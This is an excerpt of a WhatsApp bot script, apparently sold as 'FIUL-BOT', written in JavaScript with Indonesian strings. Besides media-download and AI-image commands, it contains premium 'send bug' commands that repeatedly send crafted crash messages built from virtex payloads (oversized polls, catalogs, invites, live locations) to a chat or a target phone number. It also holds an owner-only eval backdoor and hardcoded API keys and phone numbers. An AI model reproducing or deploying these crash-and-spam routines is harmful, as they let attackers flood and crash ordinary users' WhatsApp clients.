...
try {
		...
		if (isEval && senderNumber == "6285707731622") {
			let evaled,
				text = q,
			...
			try {
				...
				await kayla.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				kayla.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
...
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - 𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}
...
kayla.sendPresenceUpdate('unavailable', from)
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6285707731622@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 WhatsApp${ngazap(prefix)}`,
...
"message": {
"pollCreationMessage": {
"name": `𝐒𝐘𝐀𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`,
"options": [
	{
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI 𝐅𝐈𝐔𝐋-𝐁𝐎𝐓"
	}
],
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `𝐅𝐈𝐔𝐋 WhatsApp${ngazap(prefix)}`,
"orderTitle": "𝐅𝐈𝐔𝐋 WhatsApp${ngazap(prefix)}",
"sellerJid": "6285707731622@s.whatsapp.net",
...
let gdyr = await kayla.sendMessage(from, pepekntl, { quoted : m })
try {
...
.on('finish', async () => {
await kayla.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
...
let gedeyeer = await kayla.sendMessage(from, xnxxBokepSitus, { quoted : m })
try {
await ytdl.getInfo(Link)
...
.on('finish', async () => {
await kayla.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
...
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6285707731622`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6285707731622`}},
...
Source : ${atdl.meta.source}`, `Auto Downloader By syafiulofficial`, ftext)
}
}
...
{title: `⊟ ??𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨`, rowId: `${prefix}groupmenu`},
...
kayla.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya Btw -1 kack`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu':{
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/HnypRqF6gfPDoIgsUg91GH',
"sourceUrl": 'https://chat.whatsapp.com/HnypRqF6gfPDoIgsUg91GH'
}
}
})
break
...
kayla.sendMessage(m.chat,{text:`Mau Script Bot Nya? Buy 20k Silahkan Chat Aja Owner,Udah No Enc @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
}
break
case 'q': case 'quoted': {
...
var mediz = await kayla.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `/panjang`) {
...
var memeg = await kayla.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`Sukses`)
}
}
...
let ghd = await kayla.sendMessage(m.chat,{video:{url: res.url[0].url},caption: "```Sukses Kak Tunggu Aja Audio Nya Di Bawah Yaa```"},{quoted:m})
kayla.sendMessage(m.chat,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:ghd})
}
break
case 'mediafire':
...
await kayla.sendMessage(from, {document:{url:medfr.link},jpegThumbnail : ppnyauser, fileName:`Download Mediafire By ${m.pushName}.${medfr.mime}`, mimetype:`application/${mime}`},{quoted:m})
break
case 'googles': {
if (!q) return reply(`Example : ${prefix + command} FiuL WhatsApp`)
reply(mess.wait)
...
owned = '6285707731622@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6285707731622-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By ReiiNot Bot',
...
case 'igdl':
			...
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=AdrianTzy&url=${args[0]}`).then(({ data }) => {
				...
				if (url.includes('.mp4')) {
					kayla.sendMessage(from, { video: { url }, mimetype: 'video/mp4' })
				} else {
					kayla.sendMessage(from, { image: { url } })
				}
			})
			break
case 'ai':
	case 'openai':
	case 'search': {
		if (args.length < 1) return reply(`Masukkan kata kunci!\n\n*Contoh:* ${order} apa saja jenis hacker`)
	
		axios.get(encodeURI(`https://api.lolhuman.xyz/api/openai?apikey=AdrianTzy&text=${q}&user=user-unique-id`)).then(({
			data
		}) => {
...
case 'jadianime':{
    // suppress spam
    kayla.alreadyMakeWibu = kayla.alreadyMakeWibu ? kayla.alreadyMakeWibu : {}
    if (m.sender in kayla.alreadyMakeWibu) {
        return m.reply("Sabar Tod")
    }
    kayla.alreadyMakeWibu[m.sender] = true
    
    m.reply(mess.wait)
    try {
        // pakai const kalo variable gak di assign
        const media = await kayla.downloadAndSaveMediaMessage(quoted)
        const anu = await TelegraPH(media)
        await kayla.sendMessage(from, { 
            image: {
                url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=AdrianTzy&img=${anu}`
            }, 
            caption: "Jangan Lupa Donasi deck" 
        }, { quoted: m } )
    } catch (e) {
        kayla.sendMessage(from, { text: "Kirim foto manusia deck" }, { quoted: m })
    } finally {
        delete kayla.alreadyMakeWibu[m.sender]
    }
}
break
...
case "jadianime2": case "drawme":
				{
					...
					const img = await kayla.downloadAndSaveMediaMessage(q)
				 ...
				 reply(mess.wait)
					...
					const APIKEY = "6db1a278210ca11a593ef055";
				...
				case "remini": case "unblur":
				{
				 ...
				 reply(mess.wait)
					const { uptotelegra } = require("./scrape/upload")
                    const apirose = '6db1a278210ca11a593ef055'
        ...
        const itsrose = "6db1a278210ca11a593ef055"
        if (!q) {
 ...
 image: { 
        ...
        kayla.sendMessage(from, buttonMessage, { quoted: m } )
        }
        break
        ...
        let buttons = [
           ...
           let buttonMessage = {
 image: { 
                url: `https://api.itsrose.site/image/stable/diffusion?prompt=${q}&apikey=${itsrose}`
            },
            caption: "Teksnya " + q,
            footer: ``,
            buttons: buttons
	...
	ini_buffer = await getBuffer(encodeURI(`https://api.lolhuman.xyz/api/attp2?apikey=${apilol}&text=${teks}`))
		await kayla.sendMessage(from, { sticker: ini_buffer }, { quoted: m })
...
break
	...
	ini_buffer = await getBuffer(encodeURI(`https://api.lolhuman.xyz/api/ttp6?apikey=AdrianTzy${apilol}&text=${teks}`))
		await kayla.sendMessage(from, { sticker: ini_buffer }, { quoted: m })
		.catch((err) => m.reply('Terjadi kesalahan!'))
	}
...
break
      case 'igdl':
                    ...
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=AdrianTzy&url=${args[0]}`)
                    ini_url = ini_url.result
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    ini_buffer = await getBuffer(ini_url)
                    await kayla.sendMessage(from, ini_buffer, ini_type, { quoted: m })
                    break
    case "aiimage": {
        const apikey = "AdrianTzy"
        if (!q) {
        ...
        let buttons = [
           ...
           let buttonMessage = {
 image: { 
                url: `https://api.lolhuman.xyz/api/dall-e?apikey=AdrianTzy${apikey}&text=${q}`
            },
            caption: "Nie Hasilnya Deck:\n" + q,
            footer: `© BY syafiulofficial`,
            buttons: buttons
        }
        kayla.sendMessage(from, buttonMessage, { quoted: m } )
        }
...
try {
let cret = await kayla.groupCreate(args.join(" "), [])
let response = await kayla.groupInviteCode(cret.id)
...
https://chat.whatsapp.com/${response}
       `
kayla.sendMessage(m.chat, { text:teks, mentions: await kayla.parseMention(teks)}, {quoted:m})
} catch {
reply("Error!")
}
}
...
case 'send':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Penggunaan ${prefix+command} 62857××××××××`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
...
break
case 'tobunga': case 'tocrash': case 'tospam': case '👻': case '💀': case '☠️': case '👽': case '👾': case '🤖': case '🎃': case '👹': case '👺': case '💐': case '🥀': case '🔥': case '🌹': case '🗿': case '🌷': case '🌺': case '🌸': case '🏵': case '️🌻': case '🤡': {
if (!isPrem) return replyprem(mess.premium)
sendBug(from)
await sleep(1000)
sendBug(from)
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kayla.sendMessage(m.chat,{text:wm},{quoted:lep})
}
...
kayla.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fdoc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'kaygosend2':
if (!isPrem) return replyprem(mess.premium)
...
kayla.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:foto})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'kaygosend3':
if (!isPrem) return replyprem(mess.premium)
...
kayla.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fvoc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'kaygosend4':
if (!isPrem) return replyprem(mess.premium)
...
kayla.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fgif})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'kaygosend5':
if (!isPrem) return replyprem(mess.premium)
...
kayla.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:floc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'kaygosend6':
if (!isPrem) return replyprem(mess.premium)
...
"retailerId": wm, 
"productImageCount": 1}, 
"businessOwnerJid": `6285707731622@s.whatsapp.net`}}}	
...
contextInfo:{
"externalAdReply": {
"title": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`,
"body": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://www.youtube.com/channel/UCs6_PmL5XM7KB3gIOOyx2gA`,
...
"name": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`,
...
Message: { 
extendedTextMessage: { 
text: `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, ppnyauser, "6285707731622@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 WhatsApp ${virus} ${virtex(prefix)}`,
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}${virtex(prefix)}`, ppnyauser, "6285707731622@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
case 'santedpcparah': 
if (!itsMeKayla) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 62857××××××××`)
...
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6285707731622@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐅𝐈𝐔𝐋 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐅𝐈𝐔𝐋 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐅𝐈𝐔𝐋 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
...
kayla.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-𝐅𝐈𝐔𝐋 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐅𝐈𝐔𝐋 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
...
"name": `𝐅𝐈𝐔𝐋-𝐁𝐎𝐓 ${virus}`,
"address": `Created By 𝐅𝐈𝐔𝐋 ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
await kayla.sendMessage(from, { image: { url : bykay }, caption: mess.succes }, { quoted : m })
}
break
case 'bijak':
case 'dare':
...
kayla.sendMessage(m.chat, xmrlodijxkg, { quoted: m })
}
break
case 'pantun':{
if (!isPrem) return replyprem(mess.premium)
...
kayla.sendMessage(m.chat, RowndSkdk, { quoted: m })
}
break
case 'quotes':{
if (!isPrem) return replyprem(mess.premium)
...
kayla.sendMessage(m.chat, zpwkfeDpwk, { quoted: m })
}
break
case 'quotesanime':{
if (!isPrem) return replyprem(mess.premium)
...
let AdlemzasAj = {
text: `Quotes : ${qpsmwk.quote}
Character : ${qpsmwk.character}
Anime : ${qpsmwk.anime}
Episode : ${qpsmwk.episode}`,
footerText: 'Pencet Button Untuk Next',
buttons: vrpfmrm,
headerType: 2
}
kayla.sendMessage(m.chat, AdlemzasAj, { quoted: m })
}
break
...
let e = String(err)
kayla.sendMessage("6283136069020@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
